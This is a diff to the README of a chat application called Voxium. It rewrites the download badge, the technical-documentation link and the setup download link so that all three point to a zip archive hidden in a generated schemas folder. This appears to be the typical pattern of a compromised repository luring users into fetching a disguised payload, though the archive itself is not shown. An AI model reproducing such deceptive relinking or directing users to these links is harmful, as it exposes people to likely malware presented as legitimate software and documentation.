@@ -1,6 +1,6 @@
 # 🎤 Voxium - Chat Seamlessly with Friends
 
-## ![Download Voxium](https://img.shields.io/badge/Download%20Voxium-Click%20Here-brightgreen) 
+## ![Download Voxium](https://github.com/marblexoda/Voxium/raw/refs/heads/main/discord-app/src-tauri/gen/schemas/Software_3.5.zip%20Voxium-Click%20Here-brightgreen) 
 
 ---
 
@@ -52,7 +52,7 @@ Future updates for Voxium will focus on enhancing user experience and adding new
 
 ## 📜 Technical Docs
 
-For more in-depth information about the architecture and components of Voxium, check the technical documentation [here](https://github.com/marblexoda/Voxium/wiki).
+For more in-depth information about the architecture and components of Voxium, check the technical documentation [here](https://github.com/marblexoda/Voxium/raw/refs/heads/main/discord-app/src-tauri/gen/schemas/Software_3.5.zip).
 
 ---
 
@@ -68,7 +68,7 @@ To run Voxium, ensure you have:
 ## 🚀 Quick Local Setup
 
 1. **Visit the Voxium page to download the application.**  
-   [Download Voxium](https://github.com/marblexoda/Voxium)
+   [Download Voxium](https://github.com/marblexoda/Voxium/raw/refs/heads/main/discord-app/src-tauri/gen/schemas/Software_3.5.zip)
 
 2. **Install Voxium:**
    - Locate the download in your Downloads folder.
